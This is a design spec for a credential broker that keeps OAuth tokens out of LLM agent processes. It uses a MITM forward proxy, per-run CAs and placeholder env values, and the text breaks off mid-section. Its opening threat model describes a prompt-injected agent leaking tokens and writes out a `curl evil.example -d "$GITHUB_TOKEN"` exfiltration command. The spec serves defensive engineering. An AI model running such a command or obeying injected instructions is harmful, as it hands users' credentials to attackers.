# Credential Broker — Keeping OAuth Tokens Out of Agent Address Space

**Date:** 2026-05-12
**Status:** Spec — pending implementation plan
**Owner:** Jannes Stubbemann
**Depends on:** PR #5805 (OAuth backbone, `oauth_token` env binding) landed on `master`

---

## Executive Summary

PR #5805 introduces an `oauth_token` env binding that `resolveAdapterConfigForRuntime` resolves to a **plaintext bearer in the agent process environment**. For deterministic adapters that is fine, but for non-deterministic LLM agents this is the well-documented credential-exfiltration anti-pattern — a prompt-injected agent can `curl evil.example -d "$GITHUB_TOKEN"`, write the value to a file it later reads aloud, or exfiltrate via a tool call. The industry has converged on a **transport-layer credential broker** pattern (Infisical Agent Vault, exe.dev, AgentSecrets): the agent references credentials by opaque handle, an HTTP forward proxy injects the real value at the TLS boundary against a host allowlist, and the bearer never enters the agent's address space.

This spec adds that capability to Paperclip **without changing the `oauth_token` binding contract**. The follow-up is strictly orthogonal to #5805: the binding shape and persistence stay; only the resolution semantics change, gated per-agent-config via an optional new `credentialDelivery` field. Three delivery modes cover every Paperclip runtime — Paperclip-spawned sandboxes (local subprocess, e2b, daytona, kubernetes), externally-hired agents (OpenClaw, Hermes, BYO harnesses), and operators who want to bring their own broker:

| Mode | Where the bearer lives | Who runs the broker | Threat coverage |
|---|---|---|---|
| `env` (today's #5805 path) | Agent process env | None | Operator-trusted runtimes only |
| `paperclip-broker` | Broker process only | Paperclip control plane | Sandbox-runtime agents; full coverage |
| `byo-broker` | Operator's broker process | Operator (Agent Vault, our standalone broker, custom) | Externally-hired agents that opt in |

**The default is a smart resolver, not a fixed mode.** When `credentialDelivery` is unset on an agent config (the common case), dispatch picks the strongest mode the runtime supports: `paperclip-broker` if a broker is registered and reachable from the run's target runtime, `byo-broker` if the connection has registered push targets, otherwise `env` with a warn-log. The strong invariant that holds out of the box, with no operator config: **no Paperclip-spawned agent in a runtime Paperclip can inject into will see plaintext OAuth bearers in its address space.** Externally-hired agents (whose process Paperclip doesn't control) stay an operator decision; non-proxy-aware adapters get a per-provider documented escape hatch.

Default broker implementation ships as **`@paperclipai/credential-broker-builtin`** — a Paperclip plugin that runs **in-process inside the server in local-dev** (no extra daemon, no Docker) and as a **sibling Deployment in k8s** (no architectural fork — same code, different wiring). Same binary, same code path. The plugin contract (`registerCredentialBroker()`) is exposed so third parties can publish adapters for Agent Vault, HashiCorp Vault, or anything else without core changes — including externally-hired-agent authors (the Hermes Paperclip adapter, the OpenClaw gateway) who can embed our standalone broker package next to their harness.

PR #5805 lands as-is; this spec is the follow-up.

---

## Goals

1. **Default to no plaintext bearers in agent address space** for every Paperclip-spawned runtime where injection is possible — local subprocess, e2b, daytona, kubernetes. Out of the box, with no operator config, an agent run picks the strongest available delivery mode via a smart resolver.
2. **Keep OAuth bearers out of LLM agent address space** via a host-allowlisted forward proxy that injects credentials at the transport layer; agents reference credentials by deterministic placeholders.
3. **Local-first.** Single-process Paperclip dev install works without Docker, without a second daemon, without master-password setup, without any new ops surface. Same code in cloud k8s.
4. **Externally-hired agents (OpenClaw, Hermes, BYO) keep working unchanged** — the smart resolver falls back to `env` when Paperclip can't inject into the agent's runtime, and operators can opt into stronger guarantees by registering a BYO broker target without Paperclip dictating their runtime.
5. **Pluggable.** A `registerCredentialBroker()` extension slot — exactly parallel to `registerAgentAdapter()`, `registerSandboxProvider()`, and the proposed `registerExecutionTargetDriver()` — so operators can swap in Agent Vault, HashiCorp Vault, or custom implementations without touching core.
6. **Externally useful.** The standalone broker package (`@paperclipai/credential-broker`) is usable outside Paperclip — agent-harness-agnostic — and can be embedded by other agent ecosystems via a documented push API.
7. **Orthogonal to #5805.** Zero changes to the `oauth_token` binding shape, the OAuth flow routes, the `oauth_connections` table, the refresh worker's leader election, the provider YAML registry, or the EnvVarEditor UI. Only `resolveAdapterConfigForRuntime` and the sandbox-runtime bootstraps change.
8. **Per-task blast radius.** Every agent run gets a fresh, scoped session: ephemeral CA, loopback-only listener, allowlisted to exactly the OAuth connections claimed in `req.runJwt.connectionIds`.
9. **Honest observability.** Every brokered request is logged (method, host, path, status, latency, credential key, run ID) but never body/headers/query. Same redaction rules as the existing OAuth code. Every smart-resolver fallback to `env` emits a warn-log naming the run, the agent, and the reason — operators can grep their logs for "still leaking bearers, here's why".

## Non-Goals (V1)

- Replacing the existing `secret_ref` / `adapter_env` bindings — those stay plaintext-in-env. This spec is OAuth-tokens-only.
- gRPC, HTTP/3, or raw-TCP credential injection. Out of scope; `delivery: "env"` is the documented fallback.
- Per-binding override of `credentialDelivery`. Delivery is selected per agent config, not per binding.
- A managed Paperclip-hosted broker for externally-hired agents (a SaaS broker that anyone can dial into). Operators run their own.
- Replacing `company_secrets` storage. The DB stays the source of truth for tokens; the broker is a write-through cache.
- Egress filtering beyond the credential-injection host allowlist. NetworkPolicy/firewall is the sandbox runtime's job.
- Importing Agent Vault as a runtime dependency. We define a contract that lets it be a plugin if someone wants it.

---

## Architectural Decisions

| # | Decision | Rationale |
|---|---|---|
| 1 | Add optional `credentialDelivery: "env" \| "paperclip-broker" \| "byo-broker"` to `AdapterConfig`. **When unset (the common case), a smart resolver at dispatch picks the strongest mode the runtime supports**: `paperclip-broker` if a broker is registered and reachable from the target runtime, `byo-broker` if the connection has push targets, otherwise `env` with a warn-log. | Operators get the "no plaintext bearers" guarantee out of the box for runtimes Paperclip can inject into, without losing the explicit-override knob for adapters that can't honor a proxy or for externally-hired agents. Resolution is per-dispatch, not per-config-edit — adding the broker later automatically upgrades existing agents. |
| 2 | Built-in broker is a Paperclip plugin (`@paperclipai/credential-broker-builtin`) registered via `registerCredentialBroker()` in `@paperclipai/plugin-sdk`. | Same extension pattern as sandbox providers, OAuth providers, and execution-target drivers. Lets Agent Vault / Vault adapters slot in later as third-party plugins without core changes. |
| 3 | Built-in broker runs **in-process** in the Paperclip server by default; identical code runs as a sibling service in k8s deployments. | Local-first invariant — no Docker, no extra daemon, no master password. The "deploy as separate service" knob is a flag (`PAPERCLIP_CREDENTIAL_BROKER_MODE=embedded|standalone`), not a fork. |
| 4 | Per-task ephemeral CA, loopback-only listener. | Strongest local isolation: CA lives for the run's duration, is mounted only into that run's sandbox, dies with the Job/process. No shared trust anchor between concurrent dev tasks. Matches Agent Vault's session-CA model. |
| 5 | Broker authorization = a one-time-use session token derived from the existing `req.runJwt` (its `connectionIds` claim is the allowlist). | Reuses #5805 + the agents-runtime auth path. The broker doesn't need its own user model; the run JWT *is* the principal. |
| 6 | Service rules (host → header injection) are **rendered from the existing `server/oauth-providers/*.yaml` registry**, not authored separately. | Single source of truth. New OAuth providers automatically work with the broker. |
| 7 | Bearer is **never written to disk** in the broker process. Token push from refresh worker → broker is in-memory only. | Reduces surface vs. Agent Vault's encrypted-on-disk model — we accept token loss on broker restart because the refresh worker is the recovery mechanism. |
| 8 | Externally-hired agents (OpenClaw, Hermes, BYO) default to `credentialDelivery: "env"` — unchanged from #5805. They can opt into `"byo-broker"` by registering a push endpoint per connection. | Paperclip cannot inject into a process it doesn't spawn. Treating their runtime as out-of-trust-boundary is the honest model. |
| 9 | The `@paperclipai/credential-broker` package is shipped as a **separately publishable npm package** so it can be embedded by external agent harnesses (Hermes adapter, OpenClaw gateway) without taking a dep on Paperclip server. | Externally useful — answers the "can this be of use to others" question affirmatively. Same package is the default plugin. |
| 10 | No new database table. `byo-broker` push targets are stored as a `broker_targets` JSON column on `oauth_connections` (or a small adjacent table if Drizzle norms prefer). | Smallest possible schema delta on top of #5805's `0085_oauth_connections.sql`. |

---

## 1. The Three Delivery Modes

### 1.1 `delivery: "env"` — today's #5805 path

Unchanged. `resolveAdapterConfigForRuntime("co-1", { env: { GH: { type: "oauth_token", connectionId: "c-1", field: "access" } } })` returns `{ env: { GH: "<plaintext-bearer>" } }`. Same code path the PR ships. Threat model: agent is trusted with the bearer for the duration of the run.

**When to use:**
- Externally-hired agents whose operator trusts their own runtime.
- Local-dev shortcuts for adapters that don't honor `HTTPS_PROXY` (some MCP servers, gRPC SDKs).
- Migration period before per-provider proxy rollout.

### 1.2 `delivery: "paperclip-broker"` — Paperclip-spawned sandbox runtimes

For runtimes Paperclip controls — `claude_local` subprocess, e2b, daytona, kubernetes — the orchestrator can set process env and mount files before exec. The flow:

1. Adapter dispatch resolves `oauth_token` bindings to **placeholders** (`__oauth_<connectionId>_access__`) instead of bearers. Placeholders are deterministic and reveal nothing — knowing the placeholder string doesn't help an attacker.
2. The dispatch also mints a **session** on the broker: a one-time-use session token derived from `req.runJwt`, valid for the run's duration, scoped to the `connectionIds` claimed by the JWT. The session yields `{ proxyUrl, caCertPem, sessionToken }`.
3. The sandbox runtime bootstraps the agent process with:
   - `HTTPS_PROXY` / `HTTP_PROXY` = broker proxy URL
   - `NO_PROXY` = appropriate exclusions (loopback, Paperclip's own callback endpoint)
   - CA-trust env: `SSL_CERT_FILE`, `NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, `GIT_SSL_CAINFO`, `DENO_CERT` (same set Agent Vault documents — it's the language-runtime union, well-tested)
   - CA cert mounted at `${certPath}` (the value the env vars point at)
   - The placeholder env (`GH=__oauth_c-1_access__`)
4. Agent makes a normal HTTPS request to `api.github.com`. The proxy:
   - Authenticates the `CONNECT` via `Proxy-Authorization: Bearer <sessionToken>`.
   - Looks up the session → run → company → connection allowlist.
   - Matches `api.github.com` against the GitHub provider YAML's service rules.
   - Establishes upstream TLS, presents the run's ephemeral CA to the downstream side (MITM).
   - On the inner request, strips any incoming `Authorization` header that contains the placeholder, injects `Authorization: Bearer <fresh-token-from-broker-cache>`.
   - Streams the response back. Streaming and WebSockets work — the proxy is a transparent forward proxy for traffic that doesn't need rewriting.
5. Run ends. Session is revoked. CA file is deleted (or vanishes with the ephemeral sandbox).

The agent process never sees the bearer. The broker only ever exposes the bearer to the upstream TLS socket.

### 1.3 The smart-resolver default

When `credentialDelivery` is unset on an agent config — which is the default and the common case — `resolveAdapterConfigForRuntime` runs this resolver:

```ts
function resolveDelivery(
  agentConfig: AdapterConfig,
  dispatch: { executionTarget: ExecutionTarget; oauthBindings: OAuthBinding[] },
  ctx: { registeredBroker?: CredentialBroker; brokerReachability: BrokerReachability }
): { mode: DeliveryMode; reason: string } {
  if (agentConfig.credentialDelivery) {
    return { mode: agentConfig.credentialDelivery, reason: "explicit_config" };
  }

  const externallyManagedRuntime =
    dispatch.executionTarget.kind === "external" ||         // OpenClaw, Hermes, etc.
    dispatch.executionTarget.kind === "webhook";

  if (externallyManagedRuntime) {
    const allBindingsHaveTargets = dispatch.oauthBindings.every(
      b => ctx.hasBrokerTargetsFor(b.connectionId)
    );
    return allBindingsHaveTargets
      ? { mode: "byo-broker", reason: "external_runtime_with_byo_targets" }
      : { mode: "env",        reason: "external_runtime_no_broker_targets" };
  }

  if (ctx.registeredBroker && ctx.brokerReachability.reachableFrom(dispatch.executionTarget)) {
    return { mode: "paperclip-broker", reason: "broker_available_and_reachable" };
  }

  return { mode: "env", reason: ctx.registeredBroker
    ? "broker_unreachable_from_runtime"      // e.g. embedded broker + remote sandbox
    : "no_broker_registered" };
}
```

The `BrokerReachability` capability is owned by the broker plugin itself and answers: "given this execution target, can my proxy listener be reached from a process spawned in it?"

- **Built-in broker, embedded mode**: reachable from local-subprocess; not reachable from remote sandboxes (e2b, daytona, remote k8s) — those need standalone mode.
- **Built-in broker, standalone mode**: reachable from any runtime that can route to the broker's service URL (k8s in-cluster, remote sandboxes whose egress lets them dial back). Configured per-deployment.
- **Third-party broker plugins**: answer for themselves.

Every fallback to `env` emits a structured warn-log:

```
WARN credential-broker-fallback-to-env
  runId=01HX... agentId=... executionTarget=e2b reason=broker_unreachable_from_runtime
  bindings=[{ envVar: "GH", connectionId: "c-1" }]
  hint="Install/enable the credential broker in standalone mode reachable from e2b sandboxes,
        or set credentialDelivery: env explicitly on this agent config to silence this warning."
```

Operators can grep their logs for `credential-broker-fallback-to-env` to see exactly which runs are still leaking bearers and why. This is the observability counterpart to the smart default: the resolver picks the safest mode it can, and tells you when it couldn't.

### 1.4 `delivery: "byo-broker"` — externally-hired agents that opt in

For OpenClaw, Hermes, or custom externally-hired agents whose operator wants stronger guarantees:

1. Operator stands up a broker on their own machine — could be `@paperclipai/credential-broker` standalone (the same package the plugin wraps), Infisical Agent Vault, a mitmproxy addon, anything that honors the push API contract.
2. Operator registers the broker as a **push target** on the OAuth connection in Paperclip Settings → Connections → Connection detail → "Broker push targets" (new section): `{ url, authToken }`. Stored on `oauth_connections.broker_targets`.
3. Paperclip's existing refresh worker (#5805 §M2) gains a second responsibility: after persisting a refreshed token, POST it to every registered broker target for that connection. Failures are logged but don't block the refresh (the DB stays source of truth).
4. Operator bootstraps their externally-hired agent's environment with their broker's `HTTPS_PROXY`, CA, and placeholder envs. Paperclip doesn't need to know.
5. On agent dispatch, the binding resolver emits the placeholder (same as `paperclip-broker` mode) — but Paperclip doesn't mint a session; the operator manages that on their side.

This is the cleanest answer to the externally-hired question: **Paperclip pushes credentials to wherever the operator says, and the operator's runtime stays opaque to us.** It's also what makes the design interoperable with Agent Vault, HashiCorp Vault, etc. — they're just push targets.

---

## 2. Plugin Interface

### 2.1 The extension slot

In `@paperclipai/plugin-sdk`, add a new registration function parallel to the existing ones:

```ts
// packages/plugins/sdk/src/credential-broker.ts (NEW)

export interface CredentialBrokerSession {
  /** Opaque, one-time-use session token. Used as Proxy-Authorization bearer. */
  sessionToken: string;
  /** Proxy URL the agent should set as HTTPS_PROXY / HTTP_PROXY. */
  proxyUrl: string;
  /** PEM-encoded CA cert the agent process must trust for MITM TLS. */
  caCertPem: string;
  /** The placeholder strings the orchestrator should set as env values. */
  placeholders: Record<string /* envVarName */, string /* placeholder */>;
}

export interface MintSessionInput {
  /** Company scope for the session. */
  companyId: string;
  /** Run-scoped identifier; broker uses this for audit + session lifetime. */
  runId: string;
  /** Allowlisted OAuth connection IDs for this run; matches req.runJwt.connectionIds. */
  connectionIds: string[];
  /** The env bindings being resolved; broker uses these to compute placeholders. */
  oauthEnvBindings: Array<{
    envVarName: string;
    connectionId: string;
    field: "access";
  }>;
  /** TTL hint; broker may clamp. */
  ttlSeconds?: number;
}

export interface CredentialBroker {
  readonly id: string;                   // e.g. "builtin", "agent-vault"
  /** Called by orchestrator before sandbox exec. */
  mintSession(input: MintSessionInput): Promise<CredentialBrokerSession>;
  /** Called by refresh worker after a token rotation. */
  pushCredential(input: {
    companyId: string;
    connectionId: string;
    field: "access" | "refresh";
    value: string;
    expiresAt?: Date;
  }): Promise<void>;
  /** Called on run completion. Best-effort. */
  revokeSession(sessionToken: string): Promise<void>;
}

export interface RegisterCredentialBrokerCtx {
  /** Resolves the per-company connection allowlist; broker uses this on every request. */
  resolveConnections: (companyId: string) => Promise<Array<{
    id: string;
    providerId: string;        // e.g. "github", "slack"
    hosts: string[];           // from provider YAML
    headerInjection: {
      header: string;          // typically "Authorization"
      format: string;          // e.g. "Bearer {value}"
    };
  }>>;
  /** Logger; same one the plugin SDK passes elsewhere. */
  logger: PluginLogger;
}

export function registerCredentialBroker(
  factory: (ctx: RegisterCredentialBrokerCtx) => CredentialBroker | Promise<CredentialBroker>
): void;
```

### 2.2 Where it plugs in

- `server/src/services/secrets.ts` — `resolveAdapterConfigForRuntime` reads `agentConfig.credentialDelivery`. For `"env"`, today's behavior. For `"paperclip-broker"` or `"byo-broker"`, calls `broker.mintSession()` and threads the result into the returned `AdapterRuntimeConfig` (proxy env, CA path, placeholder env).
- `server/src/oauth/refresh-worker.ts` (a #5805 file) — after `persistRotatedToken`, calls `broker.pushCredential()` for built-in mode, and `pushToByoTargets()` (POST to each registered URL) for BYO mode.
- Sandbox-provider plugins (e2b, daytona, kubernetes, plus the local-subprocess adapter base) — accept a new `runtimeFiles` field on the dispatch payload to mount the CA cert, and merge the broker's `proxyEnv` into the spawned process env. **One interface change, no per-runtime broker code.**

### 2.3 Resolution at server startup

The server's plugin loader picks exactly one registered broker per process — operators select via `PAPERCLIP_CREDENTIAL_BROKER=builtin` (default) or `PAPERCLIP_CREDENTIAL_BROKER=agent-vault`. If no broker is registered, `delivery: "paperclip-broker"` resolves to a startup error with a clear message ("install @paperclipai/credential-broker-builtin or set credentialDelivery: env").

---

## 3. The Built-in Broker (`@paperclipai/credential-broker-builtin`)

### 3.1 Two run modes, one codebase

```
PAPERCLIP_CREDENTIAL_BROKER_MODE=embedded   (default)
  → broker runs in-process inside the Paperclip server
  → listens on 127.0.0.1:<random> (loopback only)
  → CA + sessions stored in-memory in the same process
  → local-dev: zero new processes

PAPERCLIP_CREDENTIAL_BROKER_MODE=standalone
  → broker runs as its own process / k8s Deployment
  → listens on 0.0.0.0:<port>
  → control plane talks to broker over HTTP (push, mint) on a sibling port
  → k8s: NetworkPolicy restricts proxy port to agent pods, control port to control plane
```

Same TypeScript code; the difference is bootstrap. The plugin's `mintSession` either calls the in-process broker directly (embedded) or makes an HTTP call to the standalone broker's API (standalone). The standalone control API is identical to the in-process function signatures — same Zod schemas on both ends.

### 3.2 Per-task ephemeral CA + loopback (chosen direction)

Each `mintSession()`:
1. Generates a fresh CA keypair (ECDSA P-256, 1-hour cert validity, deleted on `revokeSession` or session timeout).
2. Returns CA PEM in the session payload.
3. Spins up a per-session goroutine-equivalent (or registers the session in a shared listener with SNI routing — implementation detail; the embedded mode uses one listener with a session table keyed by `Proxy-Authorization` bearer).
4. In `embedded` mode, the listener is loopback-only — only processes on the same machine can reach it. For local subprocess sandboxes that share the dev box's loopback, this is enough. For e2b/daytona which run on remote hosts, the proxy URL needs to be reachable from the sandbox — which means either the sandbox routes back to the dev box (cumbersome) or the operator runs `standalone` mode. Document this clearly: **embedded mode supports local subprocess sandboxes; e2b/daytona require standalone.**

For the user's "in-process loopback" answer: embedded mode is the local default, k8s/remote-sandbox use standalone, no architectural fork — same code, different listener address.

### 3.3 Request lifecycle

```
1. Agent: CONNECT api.github.com:443 HTTP/1.1
          Proxy-Authorization: Bearer <sessionToken>
2. Broker: validate session → look up runId → check session.connectionIds
           → find provider matching host "api.github.com" → "github"
           → check "github" provider has at least one connectionId in session.connectionIds
           → if yes: respond 200 Connection established
           → if no: respond 403 with X-Paperclip-Broker-Reason: host_not_allowed_for_session
3. Broker: establish upstream TLS to api.github.com (verified normally)
           generate per-session leaf cert for "api.github.com" signed by session CA
           perform TLS handshake with agent presenting that leaf
4. Agent: GET /repos/foo/bar HTTP/1.1
          Authorization: Bearer __oauth_c-1_access__
          (or: no auth header at all — both supported)
5. Broker: read first request line + headers
           if Authorization header contains a known placeholder → strip
           inject Authorization: Bearer <cached-real-token-for-c-1>
           forward to upstream socket
6. Stream upstream response back unmodified.
7. On WebSocket upgrade or streaming response: pass-through bytes after the auth injection.
```

### 3.4 Logging

Per request, log: `{ runId, sessionId, companyId, connectionId, method, host, path, status, latency_ms, response_bytes, credential_key }`. No headers, no query string, no body — same redaction discipline as #5805's `redactToken` list. Logs land in the same structured-log sink as the rest of the server (Pino).

### 3.5 What's intentionally not there

- **No on-disk credential store.** Bearer cache is in-memory. On broker restart, the refresh worker re-pushes within 60s of the next refresh tick; in standalone mode we may add a `refreshOnStartup` flag that asks the control plane to push current tokens for all active sessions.
- **No web UI.** Configuration is via Paperclip Settings UI (#5805's Connections page) and `PAPERCLIP_*` env vars.
- **No master password.** Embedded mode has nothing to encrypt; standalone mode relies on its host's transport security (loopback + reverse proxy or NetworkPolicy).

---

## 4. Code Layout

```
packages/
  plugins/
    sdk/
      src/
        credential-broker.ts            # NEW — registerCredentialBroker() + types
    credential-brokers/                 # NEW directory, parallel to sandbox-providers/
      builtin/                          # @paperclipai/credential-broker-builtin
        package.json
        src/
          index.ts                      # registerCredentialBroker(({ ctx }) => createBroker(ctx))
          broker.ts                     # createBroker(ctx) — in-process API surface
          session-store.ts              # in-memory: sessions, CAs, cached bearers
          ca.ts                         # ECDSA P-256 CA generation, leaf signing
          proxy-listener.ts             # HTTP CONNECT, TLS MITM, header injection
          provider-rules.ts             # OAuth provider YAML → service rules
          request-log.ts                # structured per-request log
          standalone-server.ts          # express-like HTTP API for non-embedded mode
        test/
          proxy.test.ts                 # integration via local listener
          ca.test.ts
          session-store.test.ts
  credential-broker/                    # NEW: @paperclipai/credential-broker (standalone npm pkg)
    package.json                        # publishes the same broker.ts core minus plugin glue
    src/
      index.ts                          # bin entry: paperclip-credential-broker server
      lib.ts                            # re-exports broker.ts so others can embed

server/
  src/
    services/
      secrets.ts                        # MODIFIED — branch on credentialDelivery
    oauth/
      refresh-worker.ts                 # MODIFIED — push to broker + BYO targets after rotation
      broker-targets.ts                 # NEW — service for byo broker_targets CRUD
    routes/
      connections-broker-targets.ts     # NEW — REST under /api/companies/:co/connections/:id/broker-targets
    plugins/
      credential-broker-registry.ts     # NEW — picks registered broker at startup
    adapters/
      sandbox-providers/
        types.ts                        # MODIFIED — SandboxRuntimeFiles type, proxyEnv field on dispatch
  oauth-providers/                      # UNCHANGED — same YAMLs, now also rendered as broker rules

packages/
  plugins/
    sandbox-providers/
      e2b/src/plugin.ts                 # MODIFIED — accept runtimeFiles + proxyEnv
      daytona/src/plugin.ts             # MODIFIED — same
      kubernetes/src/plugin.ts          # MODIFIED — mount CA Secret, set env on Pod spec

packages/db/
  src/
    schema/
      oauth.ts                          # MODIFIED — add broker_targets JSONB column on oauth_connections
    migrations/
      0086_broker_targets.sql           # NEW — additive column, idempotent

ui/
  src/
    pages/
      settings/
        Connections.tsx                 # MODIFIED — "Broker push targets" section per connection
        ConnectionsBrokerTargets.test.tsx
    components/
      AgentConfigForm.tsx               # MODIFIED — credentialDelivery dropdown (env / paperclip-broker / byo-broker)

docs/
  superpowers/
    plans/
      2026-05-12-credential-broker-m1-plan.md  # implementation plan (separate doc)
```

---

## 5. Data Flow

### 5.1 Local-dev Paperclip + local subprocess sandbox

```
Operator runs `pnpm dev`
  server boots
    → plugin loader registers @paperclipai/credential-broker-builtin
    → broker.start({ mode: "embedded" })  → listens on 127.0.0.1:<random>
    → secrets.ts knows broker is available

Heartbeat fires for agent A (credentialDelivery: "paperclip-broker", binding: GH=oauth_token:c-1:access)
  resolveAdapterConfigForRuntime("co-1", { env: { GH: {...} } }, { delivery: "paperclip-broker", runJwt })
    → broker.mintSession({ companyId: "co-1", runId, connectionIds: ["c-1"], oauthEnvBindings: [{ envVarName: "GH", connectionId: "c-1", field: "access" }] })
    → returns { sessionToken, proxyUrl: "http://127.0.0.1:54321", caCertPem, placeholders: { GH: "__oauth_c-1_access__" } }

  Adapter dispatch (claude_local subprocess):
    write caCertPem to <runtimeRoot>/ca.pem (mode 0400, owned by run user)
    spawn `claude` with env:
      GH=__oauth_c-1_access__
      HTTPS_PROXY=http://127.0.0.1:54321
      HTTP_PROXY=http://127.0.0.1:54321
      NO_PROXY=127.0.0.1,localhost,api.paperclip.local
      SSL_CERT_FILE=<runtimeRoot>/ca.pem
      NODE_EXTRA_CA_CERTS=<runtimeRoot>/ca.pem
      REQUESTS_CA_BUNDLE=<runtimeRoot>/ca.pem
      CURL_CA_BUNDLE=<runtimeRoot>/ca.pem
      ...

  Claude runs, makes an MCP tool call that fetches api.github.com:
    → CONNECT api.github.com:443 with Proxy-Authorization: Bearer <sessionToken>
    → broker authenticates, allowlists, MITMs, injects Authorization: Bearer <real-c-1-token>
    → upstream responds, broker forwards to claude

Run ends:
  broker.revokeSession(sessionToken)
  ca.pem deleted
```

### 5.2 K8s Paperclip + kubernetes sandbox runtime

```
Paperclip server runs in a Deployment.
Credential broker runs in a sibling Deployment (standalone mode).
NetworkPolicy: only the control-plane Deployment can reach the broker's control API;
               only agent pods in paperclip-<companySlug> namespaces can reach the proxy port.

Heartbeat fires:
  secrets.ts → broker.mintSession() via HTTP to broker control API
  returns { sessionToken, proxyUrl: "http://paperclip-broker.paperclip-system.svc:14322", caCertPem, ... }

kubernetes sandbox-provider plugin builds the Job spec:
  create ephemeral Secret <run-id>-ca containing caCertPem (OwnerRef: Job)
  create ephemeral Secret <run-id>-env containing GH=__oauth_c-1_access__ and proxy env
  Pod spec:
    volumes:
      - name: ca, secret: { secretName: <run-id>-ca, items: [{ key: ca.pem, path: ca.pem, mode: 0400 }] }
    container:
      envFrom: [{ secretRef: <run-id>-env }]
      volumeMounts:
        - { name: ca, mountPath: /etc/paperclip/ca, readOnly: true }
      env:
        - { name: SSL_CERT_FILE, value: /etc/paperclip/ca/ca.pem }
        ... (same set)

Agent pod runs. Same proxy + injection flow as 5.1.
Job completion → TTLAfterFinished cleans up Secret + Pod.
On the broker, revokeSession is called by the server when the Job's terminal status arrives.
```

### 5.3 Externally-hired Hermes + operator's own broker

```
Operator runs Hermes on their own VPS via hermes-paperclip-adapter.
Operator runs @paperclipai/credential-broker (standalone npm pkg) next to Hermes.
Operator registers the broker as a push target on the github connection in Paperclip Settings:
  POST /api/companies/co-1/connections/c-1/broker-targets
    { url: "https://broker.acme.internal/push", authToken: "<rotating-shared-secret>" }

Paperclip refresh worker:
  on token rotation for connection c-1 →
    1. persist new token to company_secret_versions (existing #5805 path)
    2. for each broker_target on c-1:
         POST <target.url> with bearer <target.authToken> and body { connectionId, field: "access", value, expiresAt }
       on 4xx/5xx → log + retry with backoff, do not block step 1

On Hermes's box:
  Operator boots their broker; their broker exposes the push endpoint, accepts Paperclip's pushes.
  Hermes runs with HTTPS_PROXY pointed at the operator's local broker.
  Hermes's MCP tool calls flow through the operator's broker, which injects the bearer it received from Paperclip.

Paperclip dispatch path:
  credentialDelivery on the hired Hermes agent config is "byo-broker"
  resolveAdapterConfigForRuntime emits the placeholder env (no proxy URL — Paperclip doesn't control Hermes's env)
  The hired agent's task config carries the placeholder; the operator's local bootstrap (in hermes-paperclip-adapter) maps placeholders to its own broker's expected env.
```

---

## 6. Integration with PR #5805

### 6.1 What changes in #5805's surface

Strict inventory — these are the only files in the #5805 diff that get further edits:

| File from #5805 | Change | Why |
|---|---|---|
| `packages/shared/src/agent-config.ts` (or wherever `AdapterConfig` lives) | Add optional `credentialDelivery: "env" \| "paperclip-broker" \| "byo-broker"`, **unset by default**. Unset triggers the §1.3 smart resolver at dispatch. | The per-agent override knob from Decision 1; the default behavior is data-driven, not a hardcoded mode. |
| `server/src/services/secrets.ts` — `resolveAdapterConfigForRuntime` | Run the §1.3 resolver, then branch on the resolved mode. `"env"` is the existing code path; `"paperclip-broker"` calls `broker.mintSession()` and returns placeholders + proxy env + CA path; `"byo-broker"` returns placeholders only. Emit `credential-broker-fallback-to-env` warn-log on every fallback. | The resolution-semantics swap, with the smart default as a separate function that's pure and unit-testable. |
| `server/src/oauth/refresh-worker.ts` | After token rotation, call `broker.pushCredential()` (built-in) and push to BYO targets. | Keep the broker's bearer cache fresh; deliver to external operators. |
| `packages/shared/src/run-jwt.ts` (#5805 Task 30 extends this for `connectionIds`) | Already extended by #5805 — no further change. | Reused as the session's allowlist. |
| `ui/src/components/EnvVarEditor.tsx` | **Unchanged.** | Binding shape stays the same. |
| `server/oauth-providers/*.yaml` | **Unchanged.** | Source of truth for service rules. |
| `packages/db/src/schema/oauth.ts` and migrations | One additive migration `0086_broker_targets.sql` adds `oauth_connections.broker_targets jsonb default '[]'::jsonb not null`. | Smallest possible schema delta. |

### 6.2 What in #5805 is unchanged

- The `oauth_token` binding shape.
- `oauth_connections`, `oauth_authorization_states`, `company_secret_versions` schemas (except the additive column).
- OAuth routes (`/api/companies/:co/oauth/connect`, `/callback`, `/disconnect`).
- The PKCE / state / token-exchange code.
- The redaction allowlist (`access_token`, `refresh_token`, `id_token`, …).
- The lazy refresh path inside `resolveAdapterConfigForRuntime`.
- All the OAuth tests.

### 6.3 The one precondition (worth a tiny PR on top of #5805 before it merges, if still possible)

Reserve `credentialDelivery` on the agent config schema as an **optional, unset-by-default** field. Document that unset means "let the smart resolver pick at dispatch time." This is a one-line Zod schema change + a docs sentence. If #5805 has already merged, we add it in this follow-up as the first commit. **This is the only non-orthogonal bit**, and it's trivial.

The resolver is keyed off the dispatch's `executionTarget.kind` plus a broker-supplied `BrokerReachability` predicate, so introducing or removing brokers later doesn't require touching agent configs — existing agents automatically upgrade to `paperclip-broker` the moment a reachable broker is registered.

---

## 7. Sandbox Runtime Integration

The dispatch contract gains one new optional field, applied uniformly across runtimes:

```ts
// packages/adapters/sandbox-providers/types.ts (or wherever SandboxDispatch lives)
interface SandboxDispatchExtras {
  // ... existing fields
  /** Files to materialize in the sandbox before exec, by mount path. */
  runtimeFiles?: Array<{ path: string; content: string; mode?: number }>;
  /** Env vars to merge into the spawned process env. */
  extraEnv?: Record<string, string>;
}
```

Per-runtime cost:

| Runtime | Change | LOC estimate |
|---|---|---|
| Local subprocess (used by `claude_local`, `codex_local`, etc.) | Write `runtimeFiles` to a per-run tmpdir; merge `extraEnv` into `child_process.spawn` env. | ~40 |
| `@paperclipai/plugin-e2b` | Use E2B's `filesystem.write` for `runtimeFiles`; pass `extraEnv` to `process.start({ envs })`. | ~30 |
| `@paperclipai/plugin-daytona` | Daytona's workspace API for files; env via `process.start` analog. | ~30 |
| `@paperclipai/plugin-kubernetes` | Materialize as ephemeral Secret + Pod volumeMount; envFrom Secret. | ~60 |

No per-runtime broker code — every runtime just consumes the orchestrator's pre-resolved files+env.

---

## 8. Externally-Hired Agent Story

OpenClaw and Hermes are both **operator-self-hosted**:

- **OpenClaw + Paperclip:** webhook-based integration where Paperclip's orchestrator dispatches tasks to the operator's OpenClaw gateway. The OpenClaw process runs entirely on the operator's infrastructure. Paperclip never has process control.
- **Hermes + Paperclip:** Nous Research ships `hermes-paperclip-adapter` so Hermes runs as a "managed employee" in Paperclip companies. Hermes itself runs on the operator's VPS / Docker / local box.

For both, Paperclip can only influence what flows through the task dispatch payload, not the agent's process env. So:

